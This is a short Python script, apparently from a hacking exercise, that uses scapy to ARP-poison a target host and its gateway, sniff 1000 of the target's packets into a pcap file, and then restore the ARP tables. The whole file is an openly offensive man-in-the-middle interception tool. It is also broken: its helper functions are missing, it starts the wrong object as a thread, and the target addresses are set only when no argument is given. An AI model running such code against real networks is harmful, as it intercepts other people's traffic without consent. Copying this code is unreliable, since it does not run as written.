from scapy.all import *
import os
import signal
import sys
import threading

def main():
    if len(sys.argv) > 1:
        interface =  sys.argv[1]
    else:
        interface = 'wlp3s0'
        target_ip = '10.0.2.15'
        gateway_ip = '10.0.2.2'
        packet_count = 1000

    conf.iface = interface
    conf.verb = 0

    print('[*] Setting up %s' % interface)

    try:
        gateway_mac = get_mac(gateway_ip)
        print('[*] Gateway %s is at %s' % (gateway_ip, gateway_mac))
    except Exception:
        print('[!] Failed to obtain Gateway MAC: Exiting')
        sys.exit(0)

    try:
        target_mac = get_mac(target_ip)
        print('[*] Target %s is at %s' % (target_ip, target_mac))
    except Exception:
        print('[!] Failed to obtain Target MAC: Exiting')
        sys.exit(0)

    poison_thread = threading.Thread(target = poison_target, args = (gateway_ip, gateway_mac, target_ip, target_mac))
    poison_target.start()

    try:
        print('[*] Starting sniffer for %d packets' % packet_count)

        bpf_filter = 'ip host %s' % target_ip
        packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)
        wrpcap('poison.pcap', packets)
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
    except KeyboardInterrupt:
        restore_target(gateway_ip, gateway_mac, target_ip, target_mac)
        sys.exit(0)

if __name__ == '__main__':
    main()
